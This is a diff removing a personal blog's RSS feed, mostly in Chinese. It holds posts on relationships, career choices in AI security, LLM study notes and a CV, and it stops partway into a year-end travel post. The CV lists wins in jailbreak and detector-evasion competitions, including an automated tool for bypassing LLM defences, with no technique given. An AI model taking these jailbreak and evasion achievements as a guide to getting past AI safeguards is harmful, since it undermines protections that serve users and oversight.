@@ -1,1245 +1,902 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>b1ue0cean&#39;s world</title>
-    <link>https://BestRun.github.io/</link>
-    <description>b1ue0cean&#39;s world</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Sun, 09 Aug 2026 20:42:05 +0200</lastBuildDate>
-    
-    <atom:link href="https://BestRun.github.io/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    <item>
-      <title>对关系的一些思考</title>
-      <link>https://BestRun.github.io/life/%E5%AF%B9%E5%85%B3%E7%B3%BB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</link>
-      <pubDate>Sun, 09 Aug 2026 20:42:05 +0200</pubDate>
-      
-      <guid>https://BestRun.github.io/life/%E5%AF%B9%E5%85%B3%E7%B3%BB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</guid>
-      <description>&lt;p&gt;健身时闲来无事，反思一下自己到底会被什么样的人吸引（无论性别）。&lt;/p&gt;
-&lt;p&gt;因为我朋友跟我说，你反省一下自己，为什么总是吸引不到正确的人。&lt;/p&gt;
-&lt;p&gt;所以分两方面吧：我容易被什么样的人吸引，以及我有概率吸引到什么样的人。&lt;/p&gt;
-&lt;p&gt;我觉得吸引也分两部分：一种是欣赏角度的吸引，一种是生活陪伴意义上的吸引。从欣赏的角度来说，我很容易欣赏这样一种人：强者，有明确的目标、独立的想法，并愿意为之放弃很多，resilient、独立。为什么？因为我觉得这是我欣赏的态度，也是我一直践行的态度。&lt;/p&gt;
-&lt;p&gt;比如刚到丹麦的时候，我遇到了 Black 同学。我只跟他聊了几次，就觉得我们本质上是十分相似的人。他是那种在混乱的世界中，依然愿意坚守自己理想的人。简单点说，就是有自己的想法，并且愿意为之付出努力。他跟我说过一句让我印象很深的话：“如果读博期间有一天，我发现我认为自己的研究方向已经被解决了，我可能就会放弃读博，去做个 bartender。” 果然，在一年内，他在 HCI 方向连发了几篇顶会，也拿到了几个非常好的博士 offer。&lt;/p&gt;
-&lt;p&gt;我的老友 Oswin，是我的高中校友，现在在 Oxford 读 Physics 的 PhD。他和我一起度过了高中的竞赛时光，本科期间我们也一直互相努力。最后，他先我一步去了 Oxford 读博士，而我也还在申请中。我们都选择了学术这条道路。我们有相似的理想：希望在自己的领域内做出一些改变；我们也都憧憬未来，并相信只有自己才能拯救自己。我觉得我们对于彼此来说，都是为数不多能够真正相互理解的人。当然，我觉得这种理解建立在相似的经历之上，需要十年的筛选，甚至还需要一点聪明，才能够真正理解对方。&lt;/p&gt;
-&lt;p&gt;从生活陪伴上来说，如果我们处得来，大多是因为我们有还算 match 的背景，有相同的爱好，比如健身、喝酒，或者对方能给我一些我觉得有用的建议，比如情感上的建议。在丹麦遇到的 Wen 陪我度过了在丹麦最抑郁的几个月。我们每天健身、坐图书馆。我觉得这种算是陪伴意义上的吸引。
-但欣赏和喜欢是两回事。&lt;/p&gt;
-&lt;p&gt;Oswin 跟我说，他现在找另一半的标准，就是对未来的规划一致，并且能够理解他在做什么。我说，那要求有些太具体了吧？难道还必须是学物理的？学化学的博士就不行？他笑了笑说，学化学的也不是完全不能理解我在做什么。他笑着跟我说：“你经历了就知道自己希望的另一半是什么样的了，只不过对你来说，心动来得有些太晚了。” （感慨依稀：老了老了）&lt;/p&gt;
-&lt;p&gt;你问我怎么看。&lt;/p&gt;
-&lt;p&gt;我觉得我可能还是有些理想主义吧，希望能从对方身上找到我缺失的那一部分。希望双方在一起可以互相促进。但事实证明，这似乎不一定是一个很好的选择。可我又不喜欢那种只被我好的一面吸引的人。我会觉得，对方并不理解我的脆弱，也不理解我隐藏起来的另一面。所以就很矛盾。我是不是太作了，要求太多了。&lt;/p&gt;
-&lt;p&gt;最近发现，我总希望对一些事情要一个答案。（该死的理工科思维！&lt;/p&gt;
-&lt;p&gt;但其实，很多事情根本不需要答案。&lt;/p&gt;
-&lt;p&gt;有时候没有答案也挺美好的。&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>对AI安全的一些思考</title>
-      <link>https://BestRun.github.io/posts/%E5%AF%B9ai%E5%AE%89%E5%85%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</link>
-      <pubDate>Mon, 27 Jul 2026 00:00:00 +0200</pubDate>
-      
-      <guid>https://BestRun.github.io/posts/%E5%AF%B9ai%E5%AE%89%E5%85%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</guid>
-      <description>&lt;p&gt;好久没冒泡了，简单解释一下我现在的状态。
-在TUM交换快乐玩耍，下学期要去 CISPA 做毕设。
-但是最近 CISPA 出了点状况（危），导致我不得不考虑重新审视一下未来。
-与其说是对AI和安全的一些思考，不如说是对自己的一个深度探索。&lt;/p&gt;
-&lt;p&gt;最近在cispa做了一项 benchmark 的工作，（本来说是为博士的研究提前做数据集，现在看来也可能就只是一篇benchmark文章了）。&lt;/p&gt;
-&lt;p&gt;AI安全，最近非常热门的一个方向。无论是学术界还是工业届都有越来越多的人涌入。可能最近经常有各种新闻，claude的xxx模型，挖出了xxx个firefox漏洞，等等等等。所以，AI在安全上的能力到底发展成什么样子呢？我觉得我还是有资格可以讲一讲的。&lt;/p&gt;
-&lt;p&gt;但细分的话AI安全，可以分为两个方面: AI for security 和 AI security.
-AI security 本质上就是 AI 自己的安全，在学术界，早期就是各种测 prompt injection（早就被玩烂了），现在可能焦距到 agent 的 security 和如何做防护上。在工业界，大家关注的更多还是业务中 AI 服务的安全性（这里我没有太多发言权）。&lt;/p&gt;
-&lt;p&gt;更想说一说的是 AI for security, 我们从 AI 能够解一些数学题，在各种 reasoning benchmark 上得分越来越高，可以看出 AI 在 security 领域有着巨大的潜力。于是相应的安全方面的 benchmark 诞生了，UCB团队做了 cybergym, exploitgym 用于测试 agent 在安全领域的能力。但是模型和agent的能力越来越模糊，（跑偏了，不是来讲现有研究的limitation的）。&lt;/p&gt;
-&lt;p&gt;至少我觉得 AI for security 是有无限可能的，虽然有些朋友并不看好这块。那么在学术界还是工业界做成了我最近一直在思考的问题。学术界，计算资源会紧缺一些，但是胜在自由度高，你想研究的课题比较自由。工业界胜在资源丰富，但缺点是总要为业务服务，很难去做自己想做的的研究。&lt;/p&gt;
-&lt;p&gt;我觉得去工业界需要考虑以下几个维度：
-入场时机 x 发展前景 x 自身&lt;/p&gt;
-&lt;p&gt;总入场时机的角度：现在无疑是最好的入场时机，LLM 的 reasoning 能力飞速提升（这学期选了一个reasoning相关的seminar，读了很多相关领域的论文，其实这块还有很大的提升空间），缺的是数据和垂直的训练方法。如果现在入场，无疑是很好的的一个时机，能在该领域积累经验。&lt;/p&gt;
-&lt;p&gt;发展前景：首先，“钱”景肯定是不错的，但是会不会有天花板的存在，这个还不好说。因为没有接受博士的训练，可能工程能力和科研能力无法balance。&lt;/p&gt;
-&lt;p&gt;自身的角度：这个我觉得是最重要的，那就是我究竟适合哪条道路。其实相比于长期无正反馈，我喜欢那种短期的刺激感。可能是因为，我是安全竞赛的走出来的半学院派，而非传统的科研人。所以我迟疑了，博士能带给我的，真的值得吗，如果这三年我花在业界，也许已经可以攒一部分名气。&lt;/p&gt;
-&lt;p&gt;不管了，下学期就边做毕设，边找业界的机会吧，如果cispa的风波过了，再观望一下。&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>AI体系的思考和梳理</title>
-      <link>https://BestRun.github.io/posts/ai%E4%BD%93%E7%B3%BB%E7%9A%84%E6%80%9D%E8%80%83%E5%92%8C%E6%A2%B3%E7%90%86/</link>
-      <pubDate>Sat, 31 Jan 2026 15:37:51 +0100</pubDate>
-      
-      <guid>https://BestRun.github.io/posts/ai%E4%BD%93%E7%B3%BB%E7%9A%84%E6%80%9D%E8%80%83%E5%92%8C%E6%A2%B3%E7%90%86/</guid>
-      <description>&lt;p&gt;这篇文章出现的原因是因为我最近处于一个比较关键的转折点。
-接下来要跟未来潜在的导师合作3个月。
-可能要做一些LLM&amp;amp;SEC的工作。
-因为最近在学校做了一些静态分析的工作，反而错过了一些AI的发展？
-而接下来的工作需要我快速的建立我在AI领域的知识体系。&lt;/p&gt;
-&lt;h2 id=&#34;对于ai体系的思考&#34; &gt;对于AI体系的思考
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%af%b9%e4%ba%8eai%e4%bd%93%e7%b3%bb%e7%9a%84%e6%80%9d%e8%80%83&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;我之前的AI知识体系还停留在两年前，错过了LLM蓬勃发展的两年。
-所以如何快速构建一个适应当下的LLM知识体系尤为重要。&lt;/p&gt;
-&lt;p&gt;首先是一些名词的层出不穷，LLM distilling, DPO,  agentic RL &amp;hellip;
-如何有体系的学习，快速的学习成为了我这几天要思考的问题，因为下周就要上手项目了。&lt;/p&gt;
-&lt;h3 id=&#34;自顶向下的学习&#34; &gt;自顶向下的学习
-&lt;span&gt;
-    &lt;a href=&#34;#%e8%87%aa%e9%a1%b6%e5%90%91%e4%b8%8b%e7%9a%84%e5%ad%a6%e4%b9%a0&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;如果从自顶向下的学习的角度，以论文 &lt;a href=&#34;https://arxiv.org/pdf/2512.07533&#34;&gt;VulnLLM-R: Specialized Reasoning LLM with Agent Scaffold for Vulnerability Detection&lt;/a&gt; 为例。&lt;/p&gt;
-&lt;p&gt;论文的目标：将漏洞检测建模为一个&lt;strong&gt;推理任务（reasoning task）&lt;/strong&gt;，而不是分类任务。&lt;/p&gt;
-&lt;p&gt;论文原话直接拿来：
-train a small reasoning model that can correctly identify the vulnerabilities in input functions or projects, even when the vulnerability belongs to OOD CWEs. We further design the model to not only detect the vulnerability but label it with the correct CWE, which is valuable context for triage and patching.&lt;/p&gt;
-&lt;p&gt;训练一个专业领域的LLM的步骤大概有：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Dataset constructions&lt;/li&gt;
-&lt;li&gt;Reasoning data generation&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;![[Pasted image 20260131160116.png]]&lt;/p&gt;
-&lt;h2 id=&#34;现有的llm体系&#34; &gt;现有的LLM体系
-&lt;span&gt;
-    &lt;a href=&#34;#%e7%8e%b0%e6%9c%89%e7%9a%84llm%e4%bd%93%e7%b3%bb&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;知识蒸馏&lt;/p&gt;
-&lt;p&gt;什么是 reduced reasoning&lt;/p&gt;
-&lt;h2 id=&#34;llm的架构&#34; &gt;LLM的架构
-&lt;span&gt;
-    &lt;a href=&#34;#llm%e7%9a%84%e6%9e%b6%e6%9e%84&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;MOE&lt;/p&gt;
-&lt;p&gt;老师想看到的 一个成熟的训练计划
-训练的细节 每一个步骤都要了解&lt;/p&gt;
-&lt;p&gt;多问问Why
-数据集构建的细节，
-提供的数据集有两个
-两个分别是什么？
-reasoning从哪来？是直接从 DeepSeek 推理来的吗
-确实要考虑，因为其实reasoning是没有正确答案的。（如何评估或者改进这一部分比较重要，收集writeup？但是数据集又没有这种writeup）&lt;/p&gt;</description>
-    </item>
-    
-    <item>
-      <title>about &amp; CV</title>
-      <link>https://BestRun.github.io/about/about/</link>
-      <pubDate>Sun, 21 Dec 2025 18:37:28 +0800</pubDate>
-      
-      <guid>https://BestRun.github.io/about/about/</guid>
-      <description>&lt;h2 id=&#34;whoami&#34; &gt;WHOAMI
-&lt;span&gt;
-    &lt;a href=&#34;#whoami&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;I spent four rewarding years at Fuzhou University, majoring in Artificial Intelligence.&lt;/li&gt;
-&lt;li&gt;I interned at the Institute of Software, Chinese Academy of Sciences, under Prof. Xiang Ling (&lt;a href=&#34;https://ryderling.github.io/&#34;&gt;https://ryderling.github.io/&lt;/a&gt;).&lt;/li&gt;
-&lt;li&gt;I am currently pursuing an M.S. in Computer Engineering at Aarhus University.&lt;/li&gt;
-&lt;li&gt;I worked with Prof. Anders Møller (&lt;a href=&#34;https://cs.au.dk/~amoeller/&#34;&gt;https://cs.au.dk/~amoeller/&lt;/a&gt;) on taint analysis.&lt;/li&gt;
-&lt;li&gt;I am currently an exchange student at the Technical University of Munich (TUM).&lt;/li&gt;
-&lt;li&gt;I will conduct my master’s thesis at CISPA Helmholtz Center for Information Security in collaboration with &lt;a href=&#34;https://mengrj.github.io/&#34;&gt;Ruijie Meng&lt;/a&gt;.&lt;/li&gt;
-&lt;li&gt;I am deeply interested in the intersection of artificial intelligence and cybersecurity and plan to pursue a Ph.D. in this area.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;internship-experiences&#34; &gt;Internship experiences
-&lt;span&gt;
-    &lt;a href=&#34;#internship-experiences&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;ol&gt;
-&lt;li&gt;Yigeyun (Jan 2023 - Mar 2023)&lt;/li&gt;
-&lt;li&gt;ISCAS (Jul 2023 - Mar 2025)&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;research-experiences&#34; &gt;Research experiences:
-&lt;span&gt;
-    &lt;a href=&#34;#research-experiences&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://scholar.google.com/citations?hl=zh-TW&amp;amp;user=F3-nuQkAAAAJ&#34;&gt;Google Scholar&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;some-awards&#34; &gt;Some awards
-&lt;span&gt;
-    &lt;a href=&#34;#some-awards&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;h3 id=&#34;ai-competition&#34; &gt;AI competition
-&lt;span&gt;
-    &lt;a href=&#34;#ai-competition&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVPR 2025 Workshop – Jailbreaking Attacks on Multimodal Foundation Models&lt;/strong&gt; — 1st place, Team Leader (May 2025)
-&lt;ul&gt;
-&lt;li&gt;Jailbroke two provided multimodal models plus one black-box model; achieved the top score of 93.56.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;AIGC Adversarial Detection Competition, Image Attack Track (Tencent Zhuque Lab)&lt;/strong&gt; — 1st place, Team Leader (May 2025)
-&lt;ul&gt;
-&lt;li&gt;Built an automated prompt generator to make V2I outputs evade the Zhuque AIGC detector; &lt;a href=&#34;https://arxiv.org/abs/2505.23192&#34;&gt;writeup&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Datacon 2024 AI Security Track&lt;/strong&gt; — Top 3 / First Prize (Team Leader, Dec 2024)
-&lt;ul&gt;
-&lt;li&gt;Led LLM hallucination triggering and LLM-based threat intelligence extraction; delivered a graph-based RAG threat-intel extractor.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.datacon.org.cn/competition/competitions/91/introduction&#34;&gt;Competition link&lt;/a&gt; | &lt;a href=&#34;https://mp.weixin.qq.com/s/3RHiILBsAv3UzB4dAIJ5Hg&#34;&gt;Recap&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;ByteDance / ByteAI AI Security Competition&lt;/strong&gt; — 3rd place, Team Leader (Nov 2024)
-&lt;ul&gt;
-&lt;li&gt;Built an automated jailbreak tool bypassing LLM defenses; focused on prompt leaking &amp;amp; jailbreak challenges.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://security.bytedance.com/news/2024-security-style-challenge-launch&#34;&gt;Competition link&lt;/a&gt; | &lt;a href=&#34;https://x.com/b1ue0cean7/status/1850741725641482610&#34;&gt;Recap&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;ctf&#34; &gt;CTF
-&lt;span&gt;
-    &lt;a href=&#34;#ctf&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;Previously competed in several CTFs with ROIS and r3kapig teams.&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Rank&lt;/th&gt;
-&lt;th&gt;Event/Competition&lt;/th&gt;
-&lt;th&gt;Date&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;5th Place&lt;/td&gt;
-&lt;td&gt;DownUnderCTF 2022, Australia&amp;rsquo;s largest CTF competition&lt;/td&gt;
-&lt;td&gt;09/2022&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;12th Place&lt;/td&gt;
-&lt;td&gt;0CTF, Academic team Shanghai Jiao Tong University&lt;/td&gt;
-&lt;td&gt;09/2022&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;12th Place&lt;/td&gt;
-&lt;td&gt;Defcon CTF, Nautilus Institute&lt;/td&gt;
-&lt;td&gt;08/2022&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;3rd Place&lt;/td&gt;
-&lt;td&gt;Defcamp CTF, Cyber Security Research Center from Romania&lt;/td&gt;
-&lt;td&gt;02/2022&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Third Prize&lt;/td&gt;
-&lt;td&gt;2nd Tianyi Cup Cybersecurity Competition, National Engineering Lab of Mobile Network System and Application Security&lt;/td&gt;
-&lt;td&gt;10/2021&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;7th Place&lt;/td&gt;
-&lt;td&gt;Tencent Information Security New Star Invitation, Shenzhen Tencent Computer Technology Co.&lt;/td&gt;
-&lt;td&gt;09/2021&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>2025年终总结</title>
-      <link>https://BestRun.github.io/life/2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
-      <pubDate>Sun, 21 Dec 2025 13:49:27 +0800</pubDate>
-      
-      <guid>https://BestRun.github.io/life/2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
-      <description>&lt;h2 id=&#34;序&#34; &gt;序
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%ba%8f&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;过去的我喜欢展望未来，现在我却更怀念逝去的时光&lt;/p&gt;
-&lt;p&gt;可能是随着时间一年年过去，也渐渐能体会到时光的流逝。&lt;/p&gt;
-&lt;p&gt;逝去的，就真的逝去了。&lt;/p&gt;
-&lt;p&gt;一年会发生多少事，人的青春又有多少个一年呢？&lt;/p&gt;
-&lt;p&gt;不知道是不是因为今年在国外，想说的尤其的多。&lt;/p&gt;
-&lt;h2 id=&#34;主题-旅途&#34; &gt;主题: 旅途
-&lt;span&gt;
-    &lt;a href=&#34;#%e4%b8%bb%e9%a2%98-%e6%97%85%e9%80%94&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;今年的主题是旅途。&lt;/p&gt;
-&lt;p&gt;出国是今年旅途的第一站。&lt;/p&gt;
-&lt;p&gt;之后我又去了瑞士，德国，挪威，意大利。&lt;/p&gt;
-&lt;p&gt;用旅途可以很好的串起这一年。&lt;/p&gt;
-&lt;p&gt;人生，又何不是一直在旅途上，从一个站点，奔赴下一个站点。旅途上上你会见到形形色色的人，你会遇到朋友，知己，陌生人。他们都是人生中的过客，没人能陪伴着走过一生。但正是这些人和事，勾勒出了精彩的一生。&lt;/p&gt;
-&lt;h3 id=&#34;丹麦&#34; &gt;丹麦
-&lt;span&gt;
-    &lt;a href=&#34;#%e4%b8%b9%e9%ba%a6&#34;&gt;
